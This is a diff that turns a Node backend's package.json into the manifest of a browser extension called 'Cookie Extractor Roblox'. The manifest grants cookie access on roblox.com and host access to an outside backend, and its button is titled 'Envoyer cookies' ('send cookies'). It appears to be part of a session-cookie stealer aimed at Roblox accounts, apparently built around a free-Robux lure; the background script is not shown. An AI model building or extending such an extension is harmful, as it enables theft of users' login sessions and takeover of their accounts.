@@ -1,20 +1,19 @@
 {
-  "name": "bloxrobux-backend",
-  "version": "1.0.0",
-  "main": "server.js",
-  "type": "commonjs",
-  "scripts": {
-    "start": "node server.js",
-    "postinstall": "npx playwright install"
+  "manifest_version": 3,
+  "name": "Cookie Extractor Roblox",
+  "version": "1.0",
+  "permissions": [
+    "cookies",
+    "activeTab"
+  ],
+  "host_permissions": [
+    "https://*.roblox.com/*",
+    "https://bloxrobux-backend.onrender.com/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
   },
-  "engines": {
-    "node": "24.x"
-  },
-  "dependencies": {
-    "cors": "^2.8.5",
-    "express": "^4.22.1",
-    "node-fetch": "^2.7.0",
-    "playwright": "^1.57.0",
-    "dotenv": "^16.4.5"
+  "action": {
+    "default_title": "Envoyer cookies"
   }
 }
